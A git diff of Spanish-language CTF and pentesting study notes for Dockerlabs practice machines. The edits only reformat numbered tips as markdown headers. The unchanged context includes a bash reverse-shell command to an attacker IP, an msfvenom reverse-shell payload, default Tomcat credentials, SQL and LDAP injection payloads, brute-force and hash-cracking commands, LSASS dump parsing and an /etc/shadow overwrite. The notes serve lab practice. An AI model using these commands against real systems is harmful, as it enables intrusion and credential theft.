@@ -297,7 +297,7 @@ zip archivo.zip archivo.php
 
 -------------------------------------------------------------------------------
 
-11.- hacer fuzzing web para https:
+## 11.- hacer fuzzing web para https:
 
 Herramienta:
 
@@ -307,7 +307,7 @@ dirb http://172.17.0.2:443 /usr/share/seclists/Discovery/Web-Content/common.txt
 
 -------------------------------------------------------------------------------
 
-12.- SSTI -> SSTI (Server Side Template Injection)
+## 12.- SSTI -> SSTI (Server Side Template Injection)
 
 buscamos la tecnologia con la que trabaja la web:
 
@@ -330,7 +330,7 @@ esto aplica para formularios, solo basta que un input sea vulnerable.
 
 -------------------------------------------------------------------------------
 
-13.- SQLInjection.
+## 13.- SQLInjection.
 
 descartar vulnerabilidad:
 
@@ -353,7 +353,7 @@ casi siempre se hace los ataque de SQLMAP al login.
 
 -------------------------------------------------------------------------------
 
-14.- BYPASS para php:
+## 14.- BYPASS para php:
 
 posibles extensiones.
 
@@ -410,7 +410,7 @@ El artificio es modificar el Content - Type
 
 -------------------------------------------------------------------------------
 
-15.- WORDPRESS
+## 15.- WORDPRESS
 
 si tenemos una ip como por ejmplo 172.17.0.2 y está corriendo una web, y si al hacerle fuzzing web con gobuster encontrasmos una ruta como: /wordpress, debemos seguir haciendo fuzzing web con gobuster a /wordpress
 
@@ -451,20 +451,24 @@ Una vez que ya estamos entro de la máquina podemos observar el archivo wp-confi
 
 -------------------------------------------------------------------------------
 
-16.- SMB 
+## 16.- SMB 
 
 -> ver archivo :
 
 E:\Hacking\APUNTES\PROTOCOLOS - HERRAMIENTAS\SAMBA netbios-ssn 139-445.txt
 
-17.- Si tenemos permisos sudo con:
+-------------------------------------------------------------------------------
+
+## 17.- Si tenemos permisos sudo con:
 
 /usr/bin/ls
 /usr/bin/cat
 
 podemos utilizar los para enumerar (ls) y ver (cat), dentro del directorio root.
 
-18.- Para identificar el tipo de hash:
+-------------------------------------------------------------------------------
+
+## 18.- Para identificar el tipo de hash:
 
 hash-identifier "hash"
 
@@ -476,7 +480,7 @@ echo "ZXN0b2VzdW5zZWNyZXRvCg==" | base64 -d
 
 -------------------------------------------------------------------------------
 
-19.- Si tenemos una web donde corre tomcat, podemos utilizar las siguientes credenciales para iniciar sesión:
+## 19.- Si tenemos una web donde corre tomcat, podemos utilizar las siguientes credenciales para iniciar sesión:
 
 admin:admin
 tomcat:tomcat
@@ -492,7 +496,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.3 LPORT=443 -f war -o RevS
 
 -------------------------------------------------------------------------------
 
-20.- comando para descubrir un LFI
+## 20.- comando para descubrir un LFI
 
 herramienta wfuzz
 
@@ -506,7 +510,7 @@ E:\Hacking\APUNTES\HACKING WEB\Teoría, técnicas\LFI - Local File Inclusion .tx
 
 -------------------------------------------------------------------------------
 
-21.- Si tenemos una imagen podemos realizar esteganografia o también osint inversa subiendo la imagen a google images.
+## 21.- Si tenemos una imagen podemos realizar esteganografia o también osint inversa subiendo la imagen a google images.
 
 si ves que solo hay una imagen en la máquina víctima, bajala y aplica lo mencionado.
 
@@ -518,11 +522,11 @@ le aplicamos toda la esteganografia posible, strings exiftool, podemos encontrar
 
 -------------------------------------------------------------------------------
 
-22.- Siempre hacer ctrl + u para visualizar el codigo de la web.
+## 22.- Siempre hacer ctrl + u para visualizar el codigo de la web.
 
 -------------------------------------------------------------------------------
 
-23.-Supongamos que entré en un equipo que corre una web, con un usuario y con ese usuario no puedo escalar privilegios, puedo entrar en /var/www/html y modificar un archivo .php o crearlo y crear una reverse-shell para entrar como www-data y pueda que con ese usuario pueda escalar privilegios.
+## 23.-Supongamos que entré en un equipo que corre una web, con un usuario y con ese usuario no puedo escalar privilegios, puedo entrar en /var/www/html y modificar un archivo .php o crearlo y crear una reverse-shell para entrar como www-data y pueda que con ese usuario pueda escalar privilegios.
 
 referencia, máquina allien - dockerlabs:
 
@@ -530,7 +534,7 @@ https://github.com/dfalla/Hacking---Dockerlabs/blob/allien/allien.md
 
 -------------------------------------------------------------------------------
 
-24.- Podemos pasar archivos creando un servidor en python con el comando:
+## 24.- Podemos pasar archivos creando un servidor en python con el comando:
 
 
 en mi kali:
@@ -546,7 +550,7 @@ curl -O http://172.17.0.1:80/linpeas.sh
 
 -------------------------------------------------------------------------------
 
-25.- Puedo identificar un JWT cuando empieza con:
+## 25.- Puedo identificar un JWT cuando empieza con:
 
 ey.........
 
@@ -554,7 +558,7 @@ luego entramos en la web de jwt.io y vemos más datos.
 
 -------------------------------------------------------------------------------
 
-26.- Iniciar sesón en mysql:
+## 26.- Iniciar sesón en mysql:
 
 mysql -h 172.17.0.1 -u username --password=contraseña
 
@@ -584,7 +588,7 @@ EXIT;
 
 -------------------------------------------------------------------------------
 
-27.- JOOMLA
+## 27.- JOOMLA
 
 Intrusión:
 
@@ -592,11 +596,11 @@ System > Templates > Administrator Templates > Atun Details and Files y editamos
 
 -------------------------------------------------------------------------------
 
-28.- Muchas veces los usuarios usan una sola contraseña para la mayoria de sus accesos, como por ejemplo la contraseña para su acceso de base de datos también la pueden utilizar para iniciar sesión en una app importante.
+## 28.- Muchas veces los usuarios usan una sola contraseña para la mayoria de sus accesos, como por ejemplo la contraseña para su acceso de base de datos también la pueden utilizar para iniciar sesión en una app importante.
 
 -------------------------------------------------------------------------------
 
-29.- A veces una ip está relacionada con un dominio, debemos modificar el archivo /etc/hosts y agregar esa ip con el dominio.
+## 29.- A veces una ip está relacionada con un dominio, debemos modificar el archivo /etc/hosts y agregar esa ip con el dominio.
 
 ejemplo:
 
@@ -610,7 +614,7 @@ hay que checar si hay subdominios para agregar al etc/hosts
 
 -------------------------------------------------------------------------------
 
-30.- RCE (Ejecución remota de comandos)
+## 30.- RCE (Ejecución remota de comandos)
 
 si tenemos inpust puede haber varias opciones de ataque.
 
@@ -628,7 +632,7 @@ RCE
 
 -------------------------------------------------------------------------------
 
-31.- atque de JohnTheTipper:
+## 31.- atque de JohnTheTipper:
 
 john --format=Raw-MD5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
@@ -636,7 +640,7 @@ para el format vemos con hash-identifier el tipo de hash.
 
 -------------------------------------------------------------------------------
 
-32.- si al hacer nmap para ver versiones tenemos algo parecido a esto: 
+## 32.- si al hacer nmap para ver versiones tenemos algo parecido a esto: 
 
 3000/tcp open  http    syn-ack ttl 64 Node.js Express framewor
 
@@ -650,7 +654,7 @@ E:\Hacking\APUNTES\Dockerlabs\Fácil\ConsoleLog.txt
 
 -------------------------------------------------------------------------------
 
-33.- Hay ocasiones en que el servidor ftp se visualizan archivos de la web, entonces podemos subir una reverseshell por ftp con el comando put.
+## 33.- Hay ocasiones en que el servidor ftp se visualizan archivos de la web, entonces podemos subir una reverseshell por ftp con el comando put.
 
 referencia máquina anonymouspingu - dockerlabs:
 
@@ -658,7 +662,7 @@ https://github.com/dfalla/Hacking---Dockerlabs/blob/anonymouspingu/anonymousping
 
 -------------------------------------------------------------------------------
 
-34.- Descargar un archivo mediante scp:
+## 34.- Descargar un archivo mediante scp:
 
 desde la máquina vícitma al kali, siempre y cuando se tenga acceso mediante ssh.
 
@@ -691,7 +695,7 @@ https://github.com/dfalla/Hacking---Dockerlabs/blob/file/file.md
 
 -------------------------------------------------------------------------------
 
-35.- Lenguaje Brainfuck:
+## 35.- Lenguaje Brainfuck:
 
 
 ++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
@@ -702,7 +706,7 @@ https://www.dcode.fr/brainfuck-language
 
 -------------------------------------------------------------------------------
 
-36.- En algunas ocasiones nos encontraremos con que tenemos varios usuarios en el sistema, y no tenemos nada como escalar a algunos de ellos, entonces podemos utilizar la herramienta multi-su_force:
+## 36.- En algunas ocasiones nos encontraremos con que tenemos varios usuarios en el sistema, y no tenemos nada como escalar a algunos de ellos, entonces podemos utilizar la herramienta multi-su_force:
 
 https://github.com/Maciferna/multi-Su_Force
 
@@ -725,10 +729,10 @@ bash Linux-Su-Force.sh seller rockyou.txt
 
 -------------------------------------------------------------------------------
 
-NIVEL MEDIO:
+# NIVEL MEDIO:
 pwd
 
-1.- WORDPRESS
+## 1.- WORDPRESS
  
 A veces no funcionan la herramienta de wpscan, entonces lo que podemos hacer es buscar plugins que tengan vulnerabilidades, como por ejemplo, site editor que contiene un LFI, esto lo buscamos en searchsploit:
 
@@ -738,13 +742,13 @@ curl -s -X GET "http://172.17.0.2/" | grep plugins
 
 -------------------------------------------------------------------------------
 
-2.- Entrar a un directorio llamado " - "
+## 2.- Entrar a un directorio llamado " - "
 
 cd ./-
 
 -------------------------------------------------------------------------------
 
-3.- Conectarme por shh a un puerto que no es el 22
+## 3.- Conectarme por shh a un puerto que no es el 22
 
 ejemplo, ssh corre en el puerto 8899
 
@@ -752,11 +756,11 @@ ssh rosa@172.18.0.2 -p 8899
 
 -------------------------------------------------------------------------------
 
-4.- Casi siempre tendremos que interceptar las peticiones con burp suite, generalmente de formularios, tanto el reapeter e intruder.
+## 4.- Casi siempre tendremos que interceptar las peticiones con burp suite, generalmente de formularios, tanto el reapeter e intruder.
 
 -------------------------------------------------------------------------------
 
-5.- Si interceptamos un formulario con burpsuite y cuando enviamos parámetros (repeater), nos aparece este mensaje:
+## 5.- Si interceptamos un formulario con burpsuite y cuando enviamos parámetros (repeater), nos aparece este mensaje:
 
 Error:     'utf-8' codec can't decode byte 0xa9 in position 1: invalid start byte
 
@@ -774,7 +778,7 @@ puede que en la máquina esté corriendo el ssh, podemos hacer fuerza bruta con 
 
 -------------------------------------------------------------------------------
 
-6.- Siempre que entremos a una máquina por ssh y queremos escalar privilegios, debemos ir descartando cosa por cosa, por ejemplo:
+## 6.- Siempre que entremos a una máquina por ssh y queremos escalar privilegios, debemos ir descartando cosa por cosa, por ejemplo:
 
 verificamos el archivo .bashrc que está en el home de cada usuario.
 
@@ -805,7 +809,7 @@ find / -type f -perm -o+x 2>/dev/null
 
 -------------------------------------------------------------------------------
 
-7.- Hashes criptográficos generados en SHA-1.
+## 7.- Hashes criptográficos generados en SHA-1.
 
 Estos hashes suelen usarse para almacenar contraseñas u otros datos
 
@@ -846,7 +850,7 @@ python3 sha2text.py 'd' '$SHA1$d$BjkVArB9RcGUs3sgVKyAvxzH0eA=' '/usr/share/wordl
 
 -------------------------------------------------------------------------------
 
-8.- El software Openfire 4.7.4 que corre generalmente en el puerto 9090, se puede hacer intrusión mediante metasploit.
+## 8.- El software Openfire 4.7.4 que corre generalmente en el puerto 9090, se puede hacer intrusión mediante metasploit.
 
 exploit:
 
@@ -854,13 +858,13 @@ exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315
 
 -------------------------------------------------------------------------------
 
-9.- Siempre que tengamos un tipo de software corriendo en algún puerto de web, hay que buscar exploits, tanto en searchsploit, metasploit o algún github.
+## 9.- Siempre que tengamos un tipo de software corriendo en algún puerto de web, hay que buscar exploits, tanto en searchsploit, metasploit o algún github.
 
 ejemplo como openfire 4.7.4 que corre en el puerto 9090 falta referencia
 
 -------------------------------------------------------------------------------
 
-10.- Ver los software que tienen exploit:
+## 10.- Ver los software que tienen exploit:
 
 ejemplo:
 
@@ -882,7 +886,7 @@ System > Templates > Administrator Templates > Atun Details and Files y editamos
 
 -------------------------------------------------------------------------------
 
-11.- si en un puerto corre mongodb:
+## 11.- si en un puerto corre mongodb:
 
 ejemplo: 
 
@@ -918,11 +922,11 @@ db.usuarios.find().pretty();
 
 -------------------------------------------------------------------------------
 
-12.- Siempre que encontremos contraseñas hay que probarlas con los diferentes usuarios que encontremos, incluso con root
+## 12.- Siempre que encontremos contraseñas hay que probarlas con los diferentes usuarios que encontremos, incluso con root
 
 -------------------------------------------------------------------------------
 
-13.- si queremos generar palabras aleatorioas de diferente cantiad de caracteres, podemos utilizar la herramienta crunch
+## 13.- si queremos generar palabras aleatorioas de diferente cantiad de caracteres, podemos utilizar la herramienta crunch
 
 crunch min max tipo -o nombre_archivo.txt
 
@@ -946,7 +950,7 @@ crunch 3 3 0123456789abcdefghijklmnopqrstuvwyxz -o diclnum-letras.txt
 
 -------------------------------------------------------------------------------
 
-14.- si tenemos una versión de un programa y al buscar un exploit hay una versión anterior, podemos probar la versión anterior, puede que funcione.
+## 14.- si tenemos una versión de un programa y al buscar un exploit hay una versión anterior, podemos probar la versión anterior, puede que funcione.
 
 ejemplo:
 
@@ -955,7 +959,7 @@ versión anterior en searchsploit Apache solr 8.2.0
 
 -------------------------------------------------------------------------------
 
-15.- Si al acceder a una máquina con linux mediante metasploit y accedemos mediante meterpreter, para hacer la terminal más cómoda podemos ejecutar shell y luego mandar una bash a kali y ponernos en esucha mediante netcat:
+## 15.- Si al acceder a una máquina con linux mediante metasploit y accedemos mediante meterpreter, para hacer la terminal más cómoda podemos ejecutar shell y luego mandar una bash a kali y ponernos en esucha mediante netcat:
 
 Máquina víctima:
 
@@ -977,7 +981,7 @@ y listo hemos accedido con una bash más cómoda.
 
 -------------------------------------------------------------------------------
 
-16.- tipos de encriptación
+## 16.- tipos de encriptación
 
 base64 ->
 base85 -> https://www.dcode.fr/ascii-85-encoding
@@ -985,7 +989,7 @@ descifrador Ook! -> https://www.dcode.fr/ook-language
 
 -------------------------------------------------------------------------------
 
-17.- Los archivos .odt se pueden pasar a .zip y desconprimirlos con unzip
+## 17.- Los archivos .odt se pueden pasar a .zip y desconprimirlos con unzip
 
 mv importante_octopus.odt importante_octopus.zip
 
@@ -997,7 +1001,7 @@ https://github.com/albertomarcostic/DockerLabs-WriteUps/blob/main/M%C3%A1quina%2
 
 -------------------------------------------------------------------------------
 
-18.- Archivos .kdbx con contraseña:
+## 18.- Archivos .kdbx con contraseña:
 
 herramientas para abrirlo:
 
@@ -1021,7 +1025,7 @@ john hash.txt /usr/wordlists/rockyou.txt
 
 -------------------------------------------------------------------------------
 
-19.- A veces hay ocasiones en que tenemos que colocar un dominio con una ip en el /etc/hosts
+## 19.- A veces hay ocasiones en que tenemos que colocar un dominio con una ip en el /etc/hosts
 
 al hacer gobuster, le hacemos al dominio, ejemplo:
 
@@ -1056,7 +1060,7 @@ gobuster dir -t 200 -u http://tech.unique.nyx/ -w /usr/share/wordlists/dirbuster
 
 -------------------------------------------------------------------------------
 
-20.- si se nos permite subir un archivo malicioso con reverse shell, en cualquier lenguaje de backend, podemos acceder a la máquina de 2 formas:
+## 20.- si se nos permite subir un archivo malicioso con reverse shell, en cualquier lenguaje de backend, podemos acceder a la máquina de 2 formas:
 
 nota: en ambas formas hay que colocar netcat en escucha con algún puerto.
 
@@ -1082,7 +1086,7 @@ cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.40/443 0>%261"
 
 -------------------------------------------------------------------------------
 
-21.- Si no podemos transferir un archivo por wget o por curl, podemos subirlo mediante la web, si es el caso de que la web me permite subir cualquier archivo, el rockyou se tiene que subir una parte.
+## 21.- Si no podemos transferir un archivo por wget o por curl, podemos subirlo mediante la web, si es el caso de que la web me permite subir cualquier archivo, el rockyou se tiene que subir una parte.
 
 ejemplo:
 
@@ -1100,11 +1104,11 @@ busybox wget url-descarga
 
 -------------------------------------------------------------------------------
 
-22.- siendo el usuario www-data, a veces con el cat /etc/passwd | grep bash no me permiten ver los usuarios, entonces tengo que entrar a home para ver los usarios que existen.
+## 22.- siendo el usuario www-data, a veces con el cat /etc/passwd | grep bash no me permiten ver los usuarios, entonces tengo que entrar a home para ver los usarios que existen.
 
 -------------------------------------------------------------------------------
 
-23.- si en una web, en una pantalla me aparece el mensaje:
+## 23.- si en una web, en una pantalla me aparece el mensaje:
 
 "Error de Sistema: ($_GET['archivo']");
 
@@ -1126,7 +1130,7 @@ ya que en el directorio /shop no se encontró ningún archivo php
 
 -------------------------------------------------------------------------------
 
-24.- En algunos casos hay recursos compartidos con ssh mediante samba o ftp o rsync o algún otro servicio de recursos compartidos.
+## 24.- En algunos casos hay recursos compartidos con ssh mediante samba o ftp o rsync o algún otro servicio de recursos compartidos.
 
 ejemplo máquina dance-samba - dockerlabs
 
@@ -1187,7 +1191,7 @@ Nota: este ejemplo funciona también si subimos el id_rsa.pub y el authorized_ke
 
 -------------------------------------------------------------------------------
 
-25.- Si tengo un monton de carpetas y quiero verlas todas en una sola salida con la ejecución de un solo comando
+## 25.- Si tengo un monton de carpetas y quiero verlas todas en una sola salida con la ejecución de un solo comando
 
 me paro dónde están todas las carpetas y ejecuto:
 
@@ -1197,7 +1201,7 @@ ls -Ra -> ver archivos ocultos
 
 -------------------------------------------------------------------------------
 
-26.- si hacemos id y vemos que pertenecemos al grupo shadow, entonces podemos sacar los hashes del /etc/shadow y el passwdcrackearlos.
+## 26.- si hacemos id y vemos que pertenecemos al grupo shadow, entonces podemos sacar los hashes del /etc/shadow y el passwdcrackearlos.
 
 ejecutamos:
 
@@ -1222,7 +1226,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=crypt
 
 -------------------------------------------------------------------------------
 
-27.- Git
+## 27.- Git
 
 comando para buscar .git:
 
@@ -1289,7 +1293,7 @@ git show 0baffeec1777f9dfe201c447dcbc37f10ce1dafa
 
 -------------------------------------------------------------------------------
 
-28.- Sin existe una url /admin.php y es un inicio de sesión, entonces debe existir un usuario llamado admin o administrator o administrador.
+## 28.- Sin existe una url /admin.php y es un inicio de sesión, entonces debe existir un usuario llamado admin o administrator o administrador.
 
 podemos hacer ataque con hydra:
 
@@ -1299,7 +1303,7 @@ la parte de username y password se tiene que verificar en la web, haciendo ctrl 
 
 -------------------------------------------------------------------------------
 
-29.- Si tenemos una web personal, como un blog, podemos también hacer fuzzing a rutas como:
+## 29.- Si tenemos una web personal, como un blog, podemos también hacer fuzzing a rutas como:
 
 /sobre-mi
 /contacto
@@ -1311,7 +1315,7 @@ puede que hayan cosas por descubrir, como por ejemplo en la máquina swiss de do
 
 -------------------------------------------------------------------------------
 
-30.-  Si hacemos un gobuster a http://172.17.0.2/sobre-mi
+## 30.-  Si hacemos un gobuster a http://172.17.0.2/sobre-mi
 
 y aparece como respuesta:
 
@@ -1323,7 +1327,7 @@ hacemos fuerza bruta del formulario a /login.php, referencia, máquina swiss de 
                                                                     
 -------------------------------------------------------------------------------
 
-31.- Para máquinas de CTF o practicas de hacking e incluso en la vida real, siempre habrá un administrador como nombre de usuario: y posibles otros nombres de usuario:
+## 31.- Para máquinas de CTF o practicas de hacking e incluso en la vida real, siempre habrá un administrador como nombre de usuario: y posibles otros nombres de usuario:
 
 administrador
 administrator
@@ -1334,7 +1338,7 @@ tenerlo en cuenta para ataques de fuerza bruta para formularios con hydra.
 
 -------------------------------------------------------------------------------
                                                                                                        
-32.- Si previamente hemos agreagado una ip como por ejemplo 172.17.0.2 al /etc/hosts y la hemos relacionado con el dominio realgob.dl para hacer pentesting en una máquina y luego al hacer pentesting en otra máquina que tiene la misma ip y que tiene el puerto 80 abierto y corriendo una web y al momento de ingresar a la web por la ip me redirecciona al relgob.dl se tiene que hacer lo siguiente:
+## 32.- Si previamente hemos agreagado una ip como por ejemplo 172.17.0.2 al /etc/hosts y la hemos relacionado con el dominio realgob.dl para hacer pentesting en una máquina y luego al hacer pentesting en otra máquina que tiene la misma ip y que tiene el puerto 80 abierto y corriendo una web y al momento de ingresar a la web por la ip me redirecciona al relgob.dl se tiene que hacer lo siguiente:
 
 a.- Eliminar la ip del /etc/hosts y si no funciona con esto
 
@@ -1342,7 +1346,7 @@ b.- Elminar todo el historial
 
 -------------------------------------------------------------------------------
 
-33.- podemos ejecutar el siguiente comando si somos el usuario www-data y ver cosas interesantes:
+## 33.- podemos ejecutar el siguiente comando si somos el usuario www-data y ver cosas interesantes:
 
 find / -type f -user www-data 2>/dev/null | grep -v proc
 
@@ -1356,13 +1360,13 @@ ejemplo: máquina swiss de dockerlabs
 
 -------------------------------------------------------------------------------
 
-34.- forma de analizar un binario en mi kali:
+## 34.- forma de analizar un binario en mi kali:
 
 strings sendinv2
 
 -------------------------------------------------------------------------------
 
-35.- si tengo por ejemplo un input dónde pueda escribir una ip y ver si tengo conectividad con la ip, puedo intentar REC , Ejecución remota de comandos.
+## 35.- si tengo por ejemplo un input dónde pueda escribir una ip y ver si tengo conectividad con la ip, puedo intentar REC , Ejecución remota de comandos.
 
 En general en cualquier input
 
@@ -1374,7 +1378,7 @@ para el caso:
 
 -------------------------------------------------------------------------------
 
-36.- cuando tenga un problema al cambiar de usuario de usuario bobby a usuario gladys por ejemplo y la conexión por netcat siendo el usuario bobby aún se cae al cambiar a gladys, 
+## 36.- cuando tenga un problema al cambiar de usuario de usuario bobby a usuario gladys por ejemplo y la conexión por netcat siendo el usuario bobby aún se cae al cambiar a gladys, 
 
 lo que se hace es enviar desde una conexión netcat desde bobby a otra conexión netcat, y en esta nueva conexión recién cambiar de usuario.
 
@@ -1383,7 +1387,7 @@ ejemplo  máquina pingpong de dockerlabs
 
 -------------------------------------------------------------------------------
 
-37.- ejecución de un binario:
+## 37.- ejecución de un binario:
 
 hay que darle permiso de ejecución: chmod +x ./secret
 
@@ -1391,7 +1395,7 @@ hay que darle permiso de ejecución: chmod +x ./secret
 
 -------------------------------------------------------------------------------
 
-38.- Para analizar un binario .ELF utilizamos ghidra
+## 38.- Para analizar un binario .ELF utilizamos ghidra
 
 abrimos ghidra > new project > import file (elejimos el binario)
 
@@ -1399,7 +1403,7 @@ ghidra es para analizar malware.
 
 -------------------------------------------------------------------------------
 
-39.- si tenemos una url:
+## 39.- si tenemos una url:
 
 URL = http://g00dj0b.reverse.dl/experiments.php?module=./modules/default.php
 
@@ -1407,13 +1411,13 @@ esta url pinta para un LFI
 
 -------------------------------------------------------------------------------
 
-40.- Hacer fuzzing web con dirsearch
+## 40.- Hacer fuzzing web con dirsearch
 
 dirsearch -u http://10.10.10.248 -t 16 -e txt,html,php,asp,aspx -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 
 -------------------------------------------------------------------------------
 
-41.- Hacer fuzzing web con feroxbuster.
+## 41.- Hacer fuzzing web con feroxbuster.
 
 feroxbuster -u 'http://hackzones.hl/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,git -t 200 --random-agent --no-state -d 5
 
@@ -1421,12 +1425,12 @@ es bueno usar ambos txt tandoc medium.txt como el common.txt
 
 -------------------------------------------------------------------------------
 
-42.- Una manera de enumerar es mirar el código fuente de la web
+## 42.- Una manera de enumerar es mirar el código fuente de la web
 gg
 
 -------------------------------------------------------------------------------
 
-43.- Pasar un archivo de extensión pdf a txt.
+## 43.- Pasar un archivo de extensión pdf a txt.
 
 se ejecuta dentro de la carpeta dónde estás los pdfs
 
@@ -1434,23 +1438,23 @@ for file in *.pdf; do pdftotext -layout "$file"; done
 
 -------------------------------------------------------------------------------
 
-44.- Buscar la palabra password dentro de un directorio.
+## 44.- Buscar la palabra password dentro de un directorio.
 
 grep -rin "password" .
 
 -------------------------------------------------------------------------------
 
-45.- Utilizando exiftool sacar el nombre de los creadores de varios archivos pdf.
+## 45.- Utilizando exiftool sacar el nombre de los creadores de varios archivos pdf.
 
 exiftool -a *.pdf | grep creator | awk '{print $3}' > users.txt
 
 -------------------------------------------------------------------------------
 
-46.- Encuentras algo, enumeras, encuentras algo, enumeras.
+## 46.- Encuentras algo, enumeras, encuentras algo, enumeras.
 
 -------------------------------------------------------------------------------
 
-47.- Ingeniería Inversa.
+## 47.- Ingeniería Inversa.
 
 ejemplo:
 
@@ -1460,11 +1464,11 @@ https://github.com/DarksBlackSk/writeupdockerlabs/blob/main/reverse.md
 
 -------------------------------------------------------------------------------
 
-48.- Si tengo un formulario hay que ver su código html para ver sus limitaciones y a partir de ahí analizar un ataque.
+## 48.- Si tengo un formulario hay que ver su código html para ver sus limitaciones y a partir de ahí analizar un ataque.
 
 -------------------------------------------------------------------------------
 
-49.- Este comando simula un ataque intruder - sniper attack ed burpsuite:
+## 49.- Este comando simula un ataque intruder - sniper attack ed burpsuite:
 
 supongamos que tenemos una pagina con una url:
 
@@ -1476,7 +1480,7 @@ ffuf -ic -c -u http://192.168.247.128/hades/d00r_validation.php -X POST -H 'Cont
 
 -------------------------------------------------------------------------------
 
-50.- Archivo lsass.DMP 
+## 50.- Archivo lsass.DMP 
 
 Es un achivo de volcado de memoria (MEMORY DUMP),  asociado al proceso del Servicio de Autenticación de Seguridad Local (LSASS) en Windows.
 
@@ -1496,7 +1500,7 @@ pypykatz lsa minidump lsass.DMP > resultado.txt
 
 -------------------------------------------------------------------------------
 
-51.- si tengo una contraseña encriptada como:
+## 51.- si tengo una contraseña encriptada como:
 
 root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::
 
@@ -1516,7 +1520,7 @@ johnpass.hash --show
 
 -------------------------------------------------------------------------------
 
-52.- si tenememos un archivo ELF(Executable and Linkable Format) en C que lea archivos del sistema: ls
+## 52.- si tenememos un archivo ELF(Executable and Linkable Format) en C que lea archivos del sistema: ls
 
 ejemplo:
 soy el usuario codebad: y ejecuto sudo -l
@@ -1532,7 +1536,7 @@ sudo -u metadata /home/codebad/code "-l /home/metadata/user.txt | bash -c '/bin/
 
 -------------------------------------------------------------------------------
 
-53.-  Un archivo .csr es un Certificate Signing Request (Solicitud de Firma de Certificado) que se utiliza en el proceso de obtención de un certificado digital, contiene información codificada en formato PEM o DER. Suelen incluir:
+## 53.-  Un archivo .csr es un Certificate Signing Request (Solicitud de Firma de Certificado) que se utiliza en el proceso de obtención de un certificado digital, contiene información codificada en formato PEM o DER. Suelen incluir:
 
 - Una clave pública asociada
 
@@ -1561,7 +1565,7 @@ Si tengo ssh abierto puedo probar con los diferentes usuarios que haya encontrad
 
 -------------------------------------------------------------------------------
 
-54.- Si al entrar a la web http://172.17.0.2 nos encontramos con este mensaje:
+## 54.- Si al entrar a la web http://172.17.0.2 nos encontramos con este mensaje:
 
 Bienvenido al servidor CTF Patriaquerida.¡No olvides revisar el archivo oculto en /var/www/html/.hidden_pass!
 
@@ -1573,7 +1577,7 @@ http://172.17.0.2/.hidden_pass
 
 -------------------------------------------------------------------------------
 
-55.- Archivos .pem:
+## 55.- Archivos .pem:
 
 los archivos .pem guardan llaves privadas para conectarme por ssh, ssl
 
@@ -1592,7 +1596,7 @@ demogorgon
 
 -------------------------------------------------------------------------------
 
-56.- La vulnerabilidad SQLi puede estar en una cookie.
+## 56.- La vulnerabilidad SQLi puede estar en una cookie.
 
 cookie: ..... ' and 1=1
 
@@ -1604,7 +1608,7 @@ cookie:...... ' (select 'a' from users where username='administrator' limit 1,1)
 
 -------------------------------------------------------------------------------
 
-57.- A veces los formularios tiene funcionamiento con LDAP:
+## 57.- A veces los formularios tiene funcionamiento con LDAP:
 
 una posible vulnerabilidad sería LDAP Injection:
 
@@ -1619,7 +1623,7 @@ esto funciono para la máquina:
 
 -------------------------------------------------------------------------------
 
-58.- Si tenemos una rbash, bash con restricción tenemos que ver que comandos podemos usar, y según eso ver que poemos hacer y si tenemos python3 instalado, podemos probar con el siguiente comando:
+## 58.- Si tenemos una rbash, bash con restricción tenemos que ver que comandos podemos usar, y según eso ver que poemos hacer y si tenemos python3 instalado, podemos probar con el siguiente comando:
 
 python3 -c "import subprocess; subprocess.run('/bin/bash', shell=True)"
 
@@ -1629,14 +1633,14 @@ export PATH=/bin
 
 -------------------------------------------------------------------------------
 
-59.- formas comunes de codificar:
+## 59.- formas comunes de codificar:
 
 base32
 base64
 
 -------------------------------------------------------------------------------
 
-60.- Siempre que tengamos un binario y no esté en gtfobinds lo ejecutamos para ver que hace
+## 60.- Siempre que tengamos un binario y no esté en gtfobinds lo ejecutamos para ver que hace
 
 ejemplo :
 
@@ -1658,11 +1662,11 @@ y listo somos root
 
 -------------------------------------------------------------------------------
 
-61.- Carpeta donde se almacena los reportes de sqlmap
+## 61.- Carpeta donde se almacena los reportes de sqlmap
 
 -------------------------------------------------------------------------------
 
-62.- Si no conosco que hace un binario puedo ejecutar el comando
+## 62.- Si no conosco que hace un binario puedo ejecutar el comando
 
 man nombre_binario
 
@@ -1674,7 +1678,7 @@ si veo opciones como -l para ejecutar comandos veo la forma de escalar privilegi
 
 -------------------------------------------------------------------------------
 
-63.- si tenemos la opción de subir archivos por NFS podemos montarnos sistema de archivos en nuestro kali y subir un archivo.
+## 63.- si tenemos la opción de subir archivos por NFS podemos montarnos sistema de archivos en nuestro kali y subir un archivo.
 
 listar recursos compartidos:
 
@@ -1716,11 +1720,11 @@ http://192.168.42.137/reverse.php
 
 -------------------------------------------------------------------------------
 
-64.- Cuando no podemos hacer nada, y tenemos el servicio ssh podemos tratar de ingresar por ssh y en el banner nos puede dar una pista, como algún nombre de usuario.
+## 64.- Cuando no podemos hacer nada, y tenemos el servicio ssh podemos tratar de ingresar por ssh y en el banner nos puede dar una pista, como algún nombre de usuario.
 
 -------------------------------------------------------------------------------
 
-65.- Si pertenezco al grupo shadow puedo modificar el /etc/shadow y cambiarle la contraseña al root, entonces lo dejo sin contraseña.
+## 65.- Si pertenezco al grupo shadow puedo modificar el /etc/shadow y cambiarle la contraseña al root, entonces lo dejo sin contraseña.
 
 ejecutamos: id
 uid=1000(b.taylor) gid=1000(b.taylor) grupos=1000(b.taylor),42(shadow)
@@ -1740,7 +1744,7 @@ openssl passwd password1
 
 copiamos el hash y lo pegamos en el /etc/shadow
 
